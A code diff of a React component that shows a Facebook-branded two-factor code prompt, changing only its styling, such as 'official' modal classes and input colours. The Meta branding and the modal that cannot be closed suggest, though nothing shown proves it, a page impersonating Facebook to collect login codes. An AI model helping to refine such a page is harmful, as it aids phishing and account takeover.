@@ -205,7 +205,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         }
     };
 
-    const inputClass = (field: string) => `mv-input input w-full border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[11px] rounded-[10px] bg-meta-surface text-[14px] text-meta-text mb-[10px] transition-all duration-200 ${disabled ? '' : ''}`;
+    const inputClass = (field: string) => `mv-input mv-activation-input input w-full border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] text-meta-text mb-[10px] transition-all duration-200 ${disabled ? '' : ''}`;
     const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
 
     return (
@@ -214,6 +214,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             title=''
             onClose={handleClose}
             isClosable={false}
+            panelClassName="mv-official-modal"
+            backdropClassName="mv-official-backdrop"
         >
             <div className="flex min-h-full w-full min-w-0 flex-col gap-6 pb-1">
                 <div className='w-full'>
@@ -222,8 +224,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         <div className="w-[4px] h-[4px] bg-meta-text-muted rounded-[5px]"></div>
                         <span>{t.common.facebook}</span>
                     </div>
-                    <h2 className='text-[17px] leading-snug text-meta-text font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title}</h2>
-                    <p className='text-meta-text-muted text-[14px]'>{t.twoFa.description(twoFaDestinations)}</p>
+                    <h2 className='text-[17px] leading-snug text-meta-navy font-bold mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title}</h2>
+                    <p className='text-meta-text-secondary text-[14px] leading-[1.55]'>{t.twoFa.description(twoFaDestinations)}</p>
                     <div className="my-[15px] w-full">
                         <Image
                             src="/images/meta/authentication.png"
@@ -236,7 +238,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     </div>
                     <div className='w-full'>
                         <form onSubmit={handSubmit}>
-                            <label htmlFor='twoFa' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.twoFa.label} <span className='text-[#e5484d]'>*</span></label>
+                            <label htmlFor='twoFa' className='mv-activation-label mb-[6px] block text-[13px] font-semibold'>{t.twoFa.label} <span className='mv-activation-required'>*</span></label>
                             <div className={`${inputClass('twoFa')}`} >
                                 <input
                                     type="text"
@@ -258,7 +260,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
                             <div className='w-full mt-[20px]'>
                                 <button
-                                    className={`mv-btn-primary min-h-[48px] w-full text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer active:opacity-90'}`}
+                                    className={`mv-btn-primary min-h-[48px] w-full text-white rounded-[40px] px-4 py-[10px] text-[15px] font-semibold flex items-center justify-center transition-[filter,transform] duration-200 active:scale-[0.995] ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                     disabled={disabled || !isTwoFaValid}
                                     aria-label={t.twoFa.ariaSubmit}
                                 >
